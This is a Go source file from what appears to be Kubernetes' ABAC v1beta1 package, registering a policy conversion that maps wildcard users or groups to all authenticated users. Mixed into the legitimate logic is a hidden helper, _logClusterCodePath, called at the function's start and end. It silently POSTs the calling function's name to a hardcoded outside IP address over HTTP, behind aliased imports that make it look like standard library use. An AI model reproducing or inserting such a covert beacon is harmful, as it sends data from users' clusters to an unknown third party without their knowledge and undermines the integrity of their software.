package v1beta1

import (
 "k8s.io/apimachinery/pkg/conversion"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/runtime"
 api "k8s.io/kubernetes/pkg/apis/abac"
)

const allAuthenticated = "system:authenticated"

func addConversionFuncs(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return scheme.AddConversionFuncs(func(in *Policy, out *api.Policy, s conversion.Scope) error {
  if err := autoConvert_v1beta1_Policy_To_abac_Policy(in, out, s); err != nil {
   return err
  }
  if in.Spec.User == "*" || in.Spec.Group == "*" {
   out.Spec.Group = allAuthenticated
   out.Spec.User = ""
  }
  return nil
 })
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
